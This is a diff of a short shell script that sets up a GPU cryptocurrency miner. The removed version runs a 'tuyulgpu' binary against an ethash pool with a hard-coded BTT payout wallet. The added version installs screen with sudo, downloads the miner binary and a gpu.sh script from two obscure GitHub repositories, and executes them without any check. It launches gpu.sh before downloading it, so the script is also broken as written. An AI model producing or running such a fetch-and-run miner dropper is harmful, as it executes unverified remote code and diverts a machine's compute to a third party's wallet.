@@ -1,7 +1,9 @@
-#!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=BTT:TVLcyMkCGurQ7YFwomod6Njedc1cDGxQLz
-WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1)
+#!/bin/sh
 
-chmod +x tuyulgpu
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpu.sh ./gpu.sh 65 75
+wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
+wget https://raw.githubusercontent.com/KaranPushar/polan/main/gpu.sh
+chmod +x gpu.sh
+./gpu.sh
